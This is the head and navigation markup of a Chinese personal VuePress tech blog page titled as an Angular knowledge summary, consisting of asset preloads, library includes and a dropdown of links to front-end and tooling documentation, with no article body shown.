<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>angular知识点总结 | 邹先生博客记录</title>
    <meta name="generator" content="VuePress 1.4.1">
    <link rel="icon" href="/vuebloger/img/logo.jpeg">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.2/jquery.fancybox.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.2/jquery.fancybox.min.css">
    <meta name="description" content="">
    <link rel="preload" href="/vuebloger/assets/css/0.styles.1f5c579b.css" as="style"><link rel="preload" href="/vuebloger/assets/js/app.9ef6ba52.js" as="script"><link rel="preload" href="/vuebloger/assets/js/7.c457106d.js" as="script"><link rel="preload" href="/vuebloger/assets/js/1.c991d8a0.js" as="script"><link rel="preload" href="/vuebloger/assets/js/42.f930fbcb.js" as="script"><link rel="preload" href="/vuebloger/assets/js/32.699dcf06.js" as="script"><link rel="prefetch" href="/vuebloger/assets/js/10.2fc7b3fc.js"><link rel="prefetch" href="/vuebloger/assets/js/100.7fbbc1ba.js"><link rel="prefetch" href="/vuebloger/assets/js/101.b342a5c3.js"><link rel="prefetch" href="/vuebloger/assets/js/102.e5bfed0c.js"><link rel="prefetch" href="/vuebloger/assets/js/103.1c004e45.js"><link rel="prefetch" href="/vuebloger/assets/js/104.fbd52fd7.js"><link rel="prefetch" href="/vuebloger/assets/js/105.8a1ae092.js"><link rel="prefetch" href="/vuebloger/assets/js/106.c7925104.js"><link rel="prefetch" href="/vuebloger/assets/js/107.deaf416c.js"><link rel="prefetch" href="/vuebloger/assets/js/108.ba72bf7a.js"><link rel="prefetch" href="/vuebloger/assets/js/109.02db8538.js"><link rel="prefetch" href="/vuebloger/assets/js/11.b649e2a0.js"><link rel="prefetch" href="/vuebloger/assets/js/110.55981253.js"><link rel="prefetch" href="/vuebloger/assets/js/111.632d87dc.js"><link rel="prefetch" href="/vuebloger/assets/js/112.dd860ee0.js"><link rel="prefetch" href="/vuebloger/assets/js/113.7744c61c.js"><link rel="prefetch" href="/vuebloger/assets/js/114.afc5a900.js"><link rel="prefetch" href="/vuebloger/assets/js/12.831b2cd3.js"><link rel="prefetch" href="/vuebloger/assets/js/13.930f2726.js"><link rel="prefetch" href="/vuebloger/assets/js/14.e5c8f6df.js"><link rel="prefetch" href="/vuebloger/assets/js/15.ddb9535d.js"><link rel="prefetch" href="/vuebloger/assets/js/16.27874b69.js"><link rel="prefetch" href="/vuebloger/assets/js/17.29657b5e.js"><link rel="prefetch" href="/vuebloger/assets/js/18.3dade952.js"><link rel="prefetch" href="/vuebloger/assets/js/19.1c5b1a3e.js"><link rel="prefetch" href="/vuebloger/assets/js/20.d852b555.js"><link rel="prefetch" href="/vuebloger/assets/js/21.6de1dc73.js"><link rel="prefetch" href="/vuebloger/assets/js/22.361a90fc.js"><link rel="prefetch" href="/vuebloger/assets/js/23.91894daf.js"><link rel="prefetch" href="/vuebloger/assets/js/24.b66b149f.js"><link rel="prefetch" href="/vuebloger/assets/js/25.4349a352.js"><link rel="prefetch" href="/vuebloger/assets/js/26.0ac1aa03.js"><link rel="prefetch" href="/vuebloger/assets/js/27.fb78ea0b.js"><link rel="prefetch" href="/vuebloger/assets/js/28.b6774032.js"><link rel="prefetch" href="/vuebloger/assets/js/29.7b9797d4.js"><link rel="prefetch" href="/vuebloger/assets/js/30.af27d07d.js"><link rel="prefetch" href="/vuebloger/assets/js/31.e713824e.js"><link rel="prefetch" href="/vuebloger/assets/js/33.e5d64564.js"><link rel="prefetch" href="/vuebloger/assets/js/34.8e99aa4f.js"><link rel="prefetch" href="/vuebloger/assets/js/35.366931a8.js"><link rel="prefetch" href="/vuebloger/assets/js/36.ff1f4304.js"><link rel="prefetch" href="/vuebloger/assets/js/37.ce68e1a6.js"><link rel="prefetch" href="/vuebloger/assets/js/38.cd2e1b6a.js"><link rel="prefetch" href="/vuebloger/assets/js/39.6cb88b55.js"><link rel="prefetch" href="/vuebloger/assets/js/4.493208fc.js"><link rel="prefetch" href="/vuebloger/assets/js/40.8e273d47.js"><link rel="prefetch" href="/vuebloger/assets/js/41.afa41a27.js"><link rel="prefetch" href="/vuebloger/assets/js/43.4bc7941e.js"><link rel="prefetch" href="/vuebloger/assets/js/44.87d042eb.js"><link rel="prefetch" href="/vuebloger/assets/js/45.9b21e29f.js"><link rel="prefetch" href="/vuebloger/assets/js/46.23a27bb6.js"><link rel="prefetch" href="/vuebloger/assets/js/47.395a793a.js"><link rel="prefetch" href="/vuebloger/assets/js/48.6bf78796.js"><link rel="prefetch" href="/vuebloger/assets/js/49.7553f93d.js"><link rel="prefetch" href="/vuebloger/assets/js/5.cb43f664.js"><link rel="prefetch" href="/vuebloger/assets/js/50.7d83d420.js"><link rel="prefetch" href="/vuebloger/assets/js/51.6e8405b6.js"><link rel="prefetch" href="/vuebloger/assets/js/52.755ebd1d.js"><link rel="prefetch" href="/vuebloger/assets/js/53.13897655.js"><link rel="prefetch" href="/vuebloger/assets/js/54.ae6325c1.js"><link rel="prefetch" href="/vuebloger/assets/js/55.b8ce2d26.js"><link rel="prefetch" href="/vuebloger/assets/js/56.135f7068.js"><link rel="prefetch" href="/vuebloger/assets/js/57.be7db1dd.js"><link rel="prefetch" href="/vuebloger/assets/js/58.bbb04e01.js"><link rel="prefetch" href="/vuebloger/assets/js/59.e7ebb591.js"><link rel="prefetch" href="/vuebloger/assets/js/6.ff7e748f.js"><link rel="prefetch" href="/vuebloger/assets/js/60.3080a154.js"><link rel="prefetch" href="/vuebloger/assets/js/61.24831605.js"><link rel="prefetch" href="/vuebloger/assets/js/62.cad7945d.js"><link rel="prefetch" href="/vuebloger/assets/js/63.2dbcc32c.js"><link rel="prefetch" href="/vuebloger/assets/js/64.97bc0bff.js"><link rel="prefetch" href="/vuebloger/assets/js/65.5f4e8786.js"><link rel="prefetch" href="/vuebloger/assets/js/66.8b6546a7.js"><link rel="prefetch" href="/vuebloger/assets/js/67.8546a43f.js"><link rel="prefetch" href="/vuebloger/assets/js/68.8377182a.js"><link rel="prefetch" href="/vuebloger/assets/js/69.5196d10d.js"><link rel="prefetch" href="/vuebloger/assets/js/70.fd04c687.js"><link rel="prefetch" href="/vuebloger/assets/js/71.b82b2a89.js"><link rel="prefetch" href="/vuebloger/assets/js/72.f4fffc0d.js"><link rel="prefetch" href="/vuebloger/assets/js/73.654837b1.js"><link rel="prefetch" href="/vuebloger/assets/js/74.d748d39a.js"><link rel="prefetch" href="/vuebloger/assets/js/75.c98adff3.js"><link rel="prefetch" href="/vuebloger/assets/js/76.2108b240.js"><link rel="prefetch" href="/vuebloger/assets/js/77.7f773ffe.js"><link rel="prefetch" href="/vuebloger/assets/js/78.254a623a.js"><link rel="prefetch" href="/vuebloger/assets/js/79.dded7f8d.js"><link rel="prefetch" href="/vuebloger/assets/js/8.664f264d.js"><link rel="prefetch" href="/vuebloger/assets/js/80.56ac9285.js"><link rel="prefetch" href="/vuebloger/assets/js/81.7e441eca.js"><link rel="prefetch" href="/vuebloger/assets/js/82.520984fb.js"><link rel="prefetch" href="/vuebloger/assets/js/83.b0b3a95d.js"><link rel="prefetch" href="/vuebloger/assets/js/84.65ca6db6.js"><link rel="prefetch" href="/vuebloger/assets/js/85.ba5097a3.js"><link rel="prefetch" href="/vuebloger/assets/js/86.a9db20e0.js"><link rel="prefetch" href="/vuebloger/assets/js/87.295987bc.js"><link rel="prefetch" href="/vuebloger/assets/js/88.1151df7d.js"><link rel="prefetch" href="/vuebloger/assets/js/89.02c5822a.js"><link rel="prefetch" href="/vuebloger/assets/js/9.6529d756.js"><link rel="prefetch" href="/vuebloger/assets/js/90.618470a9.js"><link rel="prefetch" href="/vuebloger/assets/js/91.a1dd8864.js"><link rel="prefetch" href="/vuebloger/assets/js/92.b2795203.js"><link rel="prefetch" href="/vuebloger/assets/js/93.a5764a86.js"><link rel="prefetch" href="/vuebloger/assets/js/94.b1649dff.js"><link rel="prefetch" href="/vuebloger/assets/js/95.86cb3072.js"><link rel="prefetch" href="/vuebloger/assets/js/96.13f133b3.js"><link rel="prefetch" href="/vuebloger/assets/js/97.34a8e3d4.js"><link rel="prefetch" href="/vuebloger/assets/js/98.12a2317d.js"><link rel="prefetch" href="/vuebloger/assets/js/99.15d7de8a.js"><link rel="prefetch" href="/vuebloger/assets/js/vendors~docsearch.84ba8335.js">
    <link rel="stylesheet" href="/vuebloger/assets/css/0.styles.1f5c579b.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/vuebloger/" class="home-link router-link-active"><img src="/vuebloger/img/logo.jpeg" alt="邹先生博客记录" class="logo"> <span class="site-name can-hide">邹先生博客记录</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/vuebloger/timeLine/" class="nav-link">首页</a></div><div class="nav-item"><a href="/vuebloger/technology/" class="nav-link router-link-active">技术</a></div><div class="nav-item"><a href="/vuebloger/life/" class="nav-link">生活</a></div><div class="nav-item"><a href="/vuebloger/bake/" class="nav-link">备忘</a></div><div class="nav-item"><a href="/vuebloger/tags/" class="nav-link">标签库</a></div><div class="nav-item"><a href="/vuebloger/about/" class="nav-link">关于</a></div><div class="nav-item"><a href="/vuebloger/massage/" class="nav-link">留言板</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">链接</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://gitee.com/xccjh/projects" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Gitee
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://nextjs.frontendx.cn/docs/#%E5%AE%89%E8%A3%85" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Nextjs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://zh.nuxtjs.org/guide/installation" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Nuxtjs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://angularjs.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  AngularJS
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://reactnative.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ReactNative
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://element-cn.eleme.io/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ElementUI
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://youzan.github.io/vant/#/zh-CN/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Vant
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://developer.mozilla.org/zh-CN/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MDN
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://www.fontawesome.com.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Fontawesome
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://developers.weixin.qq.com/miniprogram/dev/index.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MiniProgram
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://reacttraining.com/react-router/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  react-router-dom
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://webpack.js.org/concepts/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  webpack
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.babeljs.cn/docs/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  babel
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://eslint.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  eslint
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.swiper.com.cn/api/index.html/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  swiper
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://momentjs.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  momentjs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.runoob.com/linux/linux-shell.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  shell
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://lodash.com/docs/4.17.15#template" target="_blank" rel="noopener noreferrer" class="nav-link external">
  lodash
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://koa.bootcss.com/#links" target="_blank" rel="noopener noreferrer" class="nav-link external">
  koa
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://jestjs.io/docs/en/getting-started" target="_blank" rel="noopener noreferrer" class="nav-link external">
  jest
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://aui.github.io/art-template/zh-cn/docs/index.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  art-template
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://ejs.bootcss.com/#docs" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ejs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.layui.com/doc/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  layui
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://antv-g2.gitee.io/zh/examples/gallery" target="_blank" rel="noopener noreferrer" class="nav-link external">
  G2
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.echartsjs.com/zh/option.html#title" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ECharts
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.vagrantup.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  vagrant
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://docs.docker.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  docker
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="/vuebloger/technology/ https:/www.runoob.com/redis/redis-tutorial.html" class="nav-link">redis</a></li><li class="dropdown-item"><!----> <a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  mysql
